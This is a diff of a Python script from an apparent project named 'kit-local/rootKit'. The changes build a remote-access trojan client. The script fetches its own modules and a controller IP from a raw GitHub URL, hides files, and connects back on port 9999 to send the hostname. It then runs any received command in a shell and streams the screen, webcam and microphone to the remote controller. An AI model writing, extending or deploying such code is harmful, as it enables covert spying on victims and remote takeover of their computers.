@@ -1,37 +1,92 @@
-from file import File
-import subprocess
+listFileDepency = ['scripter.pyw']
+hideFile = ["__pycache__"]
+githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
+
+
+import subprocess, os, requests, time, threading, select
 try:
     import easyimporting
 except:
     subprocess.Popen("py -m pip install easyimporting", shell=True)
     import easyimporting
 
-listFileDepency = ['scripter.pyw']
-hideFile = ["__pycache__"]
-githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/"
+try:
+    from file import File
+except:
+    with open("file.py", 'w'):
+            pass
+    with open("file.py", "a") as file:
+        for line in requests.get(f"{githubUrl}").text.split('\n'):
+            file.write(line)
+    from file import File
 
-f = File(f"{os.getcwd().replace('\\', '/')}/")
+
+f = File(os.getcwd().replace('\\', '/')+"/")
 for file in hideFile:
     f.hide(file)
 for file in listFileDepency:
     f.modify(file, githubUrl+file)
 from fct import *
-import sound, scripter
-s = sound()
+from sound import Sound
+import scripter
+s = Sound()
 
-easyimporting.importing("vidstream pyautogui")
+easyimporting.importing("vidstream pyautogui lib_platform pyaudio")
 from vidstream import ScreenShareClient, CameraClient
-import pyautogui
+import pyautogui, socket, lib_platform, pyaudio
 
-ipScreen = "192.168.1.25"
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 4096
+audio = pyaudio.PyAudio()
+
+
+ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
 
 def camera(port):
-    client1 = CameraClient(ipScreen, port)
-    client1.start_stream()
+    client = CameraClient(ipScreen, port)
+    client.start_stream()
 def screen(port):
     sender = ScreenShareClient(ipScreen, port)
     sender.start_stream()
+def microphone(port, ip):
+    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    serversocket.bind((ip, port))
+    serversocket.listen(1)
+    print('socket listen')
+    def callback(in_data, frame_count, time_info, status):
+        for s in read_list[1:]:
+            s.send(in_data)
+        return (None, pyaudio.paContinue)
+    try:
+        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, stream_callback=callback)
+        read_list = [serversocket]
+        try:
+            while True:
+                readable, writable, errored = select.select(read_list, [], [])
+                for s in readable:
+                    if s is serversocket:
+                        (clientsocket, address) = serversocket.accept()
+                        read_list.append(clientsocket)
+                        print("socket accept")
+                    else:
+                        data = s.recv(1024)
+                        if not data:
+                            read_list.remove(s)
+        except:
+            pass
+        print('mic stop')
+        serversocket.close()
+        stream.stop_stream()
+        stream.close()
+    except:
+        print('no mic')
+        (clientsocket, address) = serversocket.accept()
+        clientsocket.send('error'.encode())
+        serversocket.close()
     
+
 # esential function
 def terminal(command):
     subprocess.Popen(command, shell=True)
@@ -74,24 +129,56 @@ def press(key):
         for i in range(number):
             pyautogui.press("backspace")
 
+def receive(timeoutKill):
+    global run, progrun
+    while True:
+        s.settimeout(timeoutKill)
+        try:
+            receive = (s.recv(2048).decode())
+            print(receive)
+        except:
+            receive = "left"
+            print('break')
+        if receive == 'left':
+            time.sleep(2)
+            print(receive)
+            run = False
+        if receive == "die":
+            print(receive)
+            progrun = False
+            run = False
+        if receive != "●":
+            return receive
+
 def execute(data):
     global run, sortir, ossys, reloading
+    data = data.replace("●", "")
     datalist = data.split()
+    if not datalist:
+        return None
     if data == "die":
-        run = False
+        return None
     elif data[0:2] == "cd":
         cdAccess(data[3:len(data)])
     elif data[0:6] == "write(":
         write(data[6:len(data) - 1])
     elif data[0:6] == "press(":
         press(data[6:len(data) - 1])
-    elif data == "screen":
-        screen()
-    elif data == "camera":
-        camera()
+    elif datalist[0] == "screen":
+        t = threading.Thread(target=screen, args=(int(datalist[1]),))
+        t.daemon = True
+        t.start()
+    elif datalist[0] == "camera":
+        t = threading.Thread(target=camera, args=(int(datalist[1]),))
+        t.daemon = True
+        t.start()
+    elif datalist[0] == "microphone":
+        t = threading.Thread(target=microphone, args=(int(datalist[1]), datalist[2],))
+        t.daemon = True
+        t.start()
     elif data == "left":
         print("restart")
-        sortir = True  
+        return None
     elif data[0:4] == "fast":
         scripter.speed_write(data[5:len(data)])
     elif data == "test":
@@ -106,3 +193,26 @@ def execute(data):
         wallpaper(data)
     else:
         terminal(data)
+
+
+run, progrun = True, True
+timeoutKill = 2000
+
+while True:
+    BREAK = False
+    run = True
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s.connect((ipScreen, 9999))
+        s.send(str(lib_platform.hostname).encode())
+    except:
+        run = False
+        pass
+    if run:
+        while True:
+            execute(receive(timeoutKill))
+            if run == False:
+                break
+        if not progrun:
+            break
+        s.close()
